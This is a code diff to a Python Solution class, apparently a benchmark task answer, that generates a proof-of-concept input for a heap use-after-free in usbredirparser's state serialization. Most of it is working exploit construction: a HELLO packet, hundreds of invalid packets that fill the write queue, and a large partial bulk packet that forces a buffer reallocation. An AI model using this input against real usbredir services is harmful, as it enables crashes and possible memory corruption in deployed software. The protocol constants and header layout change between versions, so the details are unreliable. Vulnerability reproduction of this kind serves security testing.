@@ -5,50 +5,64 @@ class Solution:
         """
         Generate a PoC that triggers the Heap Use After Free vulnerability in usbredirparser.
         
-        The vulnerability occurs when serializing a parser state with a large amount of buffered 
-        write data (outgoing data). If the serialized size exceeds the initial buffer size 
-        (64KB), a reallocation occurs, invalidating a pointer to the 'write_buf_count' field 
-        which is written to at the end of the serialization process.
+        The vulnerability exists in `serialize_data`. It saves `parser->buf` (buffered read data)
+        and then `parser->write_buf_count`. A pointer to `write_buf_count` in the serialization
+        buffer is taken. Then the write buffers are serialized. If the write buffers cause the
+        serialization buffer to reallocate, the `write_buf_count` pointer becomes a dangling pointer
+        to freed memory. A subsequent write to this pointer causes the crash.
         
-        To trigger this, we generate a stream of valid USB_REDIR_HELLO packets. Each HELLO 
-        packet typically triggers a HELLO response from the parser. By sending enough packets 
-        without reading the responses (simulated by the harness/environment buffering them), 
-        we build up the write queue to exceed 64KB.
+        Strategy:
+        1. Send a HELLO packet to initialize the parser state.
+        2. Send many invalid packets. Each causes the parser to queue a STATUS packet response.
+           Assuming the harness simulates a blocked write or flow control, these accumulate in the
+           write buffer list.
+        3. Send a large packet header followed by incomplete data. This causes the parser to
+           buffer the incoming data in `parser->buf`.
+        
+        During serialization:
+        - `parser->buf` (large) is written, filling most of the default 64KB buffer.
+        - `write_buf_count` pointer is taken.
+        - Write buffers (from step 2) are written, forcing the buffer to grow (realloc).
+        - UAF occurs when writing the count back to the old pointer.
         """
         
-        # Protocol Constants
-        USB_REDIR_HELLO = 0
+        # USBRedir protocol constants
+        USB_REDIR_HELLO = 1
+        USB_REDIR_BULK_DATA = 13
+        USB_REDIR_INVALID = 0x7FFFFFFF  # Invalid type to trigger STATUS response
         
-        # Header structure: uint32 type, uint32 length, uint32 id
-        # usbredir uses little-endian
-        HEADER_FMT = '<III'
+        poc = bytearray()
         
-        # Payload for USB_REDIR_HELLO
-        # struct usb_redir_hello_header { char version[64]; uint32_t capabilities[0]; }
-        # Length is 64 bytes.
-        version_string = b"usb-redir-0.7"
-        payload = version_string.ljust(64, b'\x00')
-        payload_len = len(payload)
+        # 1. HELLO Packet
+        # Standard handshake to ensure parser is happy.
+        # Header: Type=1, Length=64, ID=0, Padding=0
+        hello_len = 64
+        version_string = b"usbredir-host-0.0.1"
+        hello_body = version_string.ljust(hello_len, b'\x00')
         
-        # Target size calculation:
-        # We need the serialized write buffers to exceed 64KB (65536 bytes).
-        # Each HELLO response is roughly equivalent to the input packet size (header + payload).
-        # Packet size = 12 (header) + 64 (payload) = 76 bytes.
-        # 1000 packets * 76 bytes = 76000 bytes, which is safely above 64KB.
-        # This matches the magnitude of the ground-truth PoC (~71KB).
+        poc.extend(struct.pack('<IIII', USB_REDIR_HELLO, hello_len, 0, 0))
+        poc.extend(hello_body)
         
-        num_packets = 1000
-        poc_data = bytearray()
-        
-        for i in range(num_packets):
-            # Construct Header
-            # Type: HELLO
-            # Length: 64
-            # ID: Incrementing ID
-            header = struct.pack(HEADER_FMT, USB_REDIR_HELLO, payload_len, i)
+        # 2. Generate Write Buffers
+        # Send invalid packets to trigger automatic STATUS responses (approx 20 bytes each).
+        # We need enough write data to tip the total serialized size over 64KB when combined
+        # with the buffered read data.
+        # 450 packets * 16 bytes input -> 450 * 20 bytes output = 9000 bytes write buffer.
+        num_triggers = 450
+        for i in range(num_triggers):
+            # Type=Invalid, Length=0, ID=unique, Padding=0
+            poc.extend(struct.pack('<IIII', USB_REDIR_INVALID, 0, i + 1, 0))
             
-            # Append Header and Payload
-            poc_data.extend(header)
-            poc_data.extend(payload)
-            
-        return bytes(poc_data)
+        # 3. Large Partial Packet (Buffered Read Data)
+        # Send a packet with a large declared length, but provide one byte less than declared.
+        # This forces the parser to keep the data in `parser->buf`.
+        # We aim for ~63KB to fill the serialization buffer (default 64KB) almost entirely.
+        large_len = 63000
+        
+        # Header: Type=BULK_DATA (13), Length=large_len, ID=9999, Padding=0
+        poc.extend(struct.pack('<IIII', USB_REDIR_BULK_DATA, large_len, 9999, 0))
+        
+        # Body: Provide all but 1 byte
+        poc.extend(b'A' * (large_len - 1))
+        
+        return bytes(poc)
